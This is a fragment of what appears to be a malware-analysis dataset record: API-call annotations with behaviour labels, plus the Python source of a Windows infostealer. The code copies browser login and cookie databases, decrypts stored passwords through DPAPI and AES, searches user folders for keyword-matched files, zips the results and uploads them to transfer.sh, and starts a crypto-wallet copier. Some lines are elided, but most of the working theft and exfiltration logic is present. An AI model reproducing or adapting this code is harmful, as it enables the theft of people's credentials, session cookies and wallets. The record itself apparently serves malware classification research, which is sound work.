          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "AES.new",
          "id": "init_aes_gcm",
          "description": "Initializes AES cipher in GCM mode",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "Crypto.Cipher.AES.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "upload",
          "id": "upload_file_transfer_sh",
          "description": "Uploads file to transfer.sh and returns URL",
          "first_id": "network_file_transfer",
          "second_id": "file_upload",
          "third_id": "remote_service_upload"
        },
        {
          "api_name": "psutil.process_iter",
          "id": "iterate_processes",
          "description": "Iterates over all running processes",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.name",
          "id": "get_process_name",
          "description": "Retrieves process name as string",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "urlopen",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "import os\nimport shutil\nimport sqlite3\nimport requests\nimport base64\nimport json\nimport threading\nimport zipfile\nimport psutil\nimport time\nfrom Crypto.Cipher import AES\n\n# Environment and system info\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nlogin_info = os.getlogin()\ncomputer_victim = os.getenv(\"COMPUTERNAME\")\nfast_memory_storage = str(psutil.virtual_memory()[0] / 1024**3).split(\".\")[0]\nstorage_space = str(psutil.disk_usage(\"/\")[0] / 1024**3).split(\".\")[0]\n\n# HTTP GET to retrieve regex\nbc_myregex_secret = \"https://paste.bingner.com/paste/u7qoj/raw\"\nreg_req = requests.get(bc_myregex_secret)\nregx_net = r\"[\\w-]{24}\\.\" + reg_req.text\n\n# Password extraction\n\ndef Find_Passw(path, arg):\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = temp + \"bc_is_here\" + ... + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sqlite3.connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = json.loads(f.read())\n    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        ...\n        NotPSSW.append(f\"URL: {row[0]} ... PASSW0RD: {Value_Dcryptage(row[2], master_key)}\\n\\n\")\n    writeforfile(NotPSSW, \"bc_allpasswords\")\n\n# Cookie extraction\n\ndef Get_Bc_Cook(path, arg):\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = temp + \"bc_is_here\" + ... + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sqlite3.connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = json.loads(f.read())\n    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        ...\n        Cookies.append(...)\n    writeforfile(Cookies, \"bc_allcookies\")\n\n# Zipping and exfiltration\n\ndef ZipMyThings(path, arg, procc):\n    pathC = path\n    name = arg\n    ...\n    if not os.path.exists(pathC):\n        return\n    ...\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file:\n            zf.write(pathC + \"/\" + file)\n    zf.close()\n    upload(f\"{pathC}/{name}.zip\")\n    os.remove(f\"{pathC}/{name}.zip\")\n\n# Upload to transfer.sh\n\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\n# File search and exfiltration\n\ndef bc_create_file(path, keywords):\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, UploadTo_Anon(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    CreateFolder_(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\n# Main gathering and exfiltration logic\n\ndef bc_Gather_All():\n    ...\n    for patt in browserPaths:\n        a = threading.Thread(target=Find_Passw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=Get_Bc_Cook, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies:\n        thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True:\n        return\n    for patt in browserPaths:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\n# File search in user folders\n\ndef check_spec_bc():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [user + \"/Desktop\", user + \"/Downloads\", user + \"/Documents\"]\n    key_wordsFiles = [ ... ]\n    wikith = []\n    for patt in path2search:\n        check_spec_bc = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles])\n        check_spec_bc.start()\n        wikith.append(check_spec_bc)\n    return wikith\n\n# Main execution\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()"
    }
  }
]